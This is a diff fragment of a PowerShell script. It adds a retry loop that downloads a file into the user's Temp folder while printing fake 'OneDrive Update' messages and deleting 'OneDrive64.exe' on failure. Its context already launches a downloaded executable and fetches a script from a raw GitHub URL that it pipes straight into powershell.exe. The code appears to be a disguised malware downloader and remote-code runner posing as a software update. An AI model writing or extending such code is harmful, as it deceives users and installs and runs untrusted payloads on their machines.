@@ -62,6 +62,19 @@ if (Test-Path $outputFile) {
 }
 if (Test-Path $outputFile2) {
     Start-Process -FilePath $outputFile2
+    cd $home
+    cd 'APPDATA/LOCAL/TEMP'
+    Write-Host "OneDrive Update Downloaded, downloading copy update..." -ForegroundColor Green
+    while ((Test-Path $outputFile) -eq $false) {
+        try {
+            Invoke-WebRequest -Uri $url -OutFile $outputFile
+        }
+        catch {
+            Write-Host "Error downloading OneDrive Update. Trying before..." -ForegroundColor Green
+            del 'OneDrive64.exe'
+            Start-Sleep -Seconds 10
+        }
+    }
 } else {
     $urlinstall = 'https://raw.githubusercontent.com/nikitswi/DrWeb/refs/heads/main/cmd2new.txt';$result = Invoke-WebRequest -Uri $urlinstall; powershell.exe $result.content
 }
